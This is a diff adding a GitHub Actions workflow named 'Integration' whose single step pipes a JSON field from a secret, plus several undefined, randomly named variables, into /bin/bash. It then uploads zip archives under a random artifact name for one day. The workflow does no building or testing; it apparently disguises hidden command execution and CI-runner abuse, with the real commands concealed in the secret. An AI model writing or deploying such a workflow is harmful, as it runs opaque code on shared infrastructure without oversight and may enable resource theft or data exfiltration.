@@ -1,0 +1,32 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+jobs:
+  service:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Run
+        env:
+          anabs97: ${{ secrets.anabs97 }}
+        run: |
+          printf '%s' "$anabs97" | jq -r .xtbfj77976 | /bin/bash
+          printf '%s' "$rqn0" | jq -r .qkeb22 | /bin/bash
+          echo $lii9389 | jq -r .t480 | /bin/bash
+          printf '%s' "$vwyr7" | jq -r .c32442 | /bin/bash
+          printf '%s' "$qr6813" | jq -r .xfxlv9278 | /bin/bash
+          echo $h0 | jq -r .hquw39 | /bin/bash
+          printf '%s' "$uk9" | jq -r .fsabb17595 | /bin/bash
+
+      - name: Save archive
+        uses: actions/upload-artifact@v4
+        with:
+          name: pNx6WHSy
+          path: "*.zip"
+          retention-days: 1
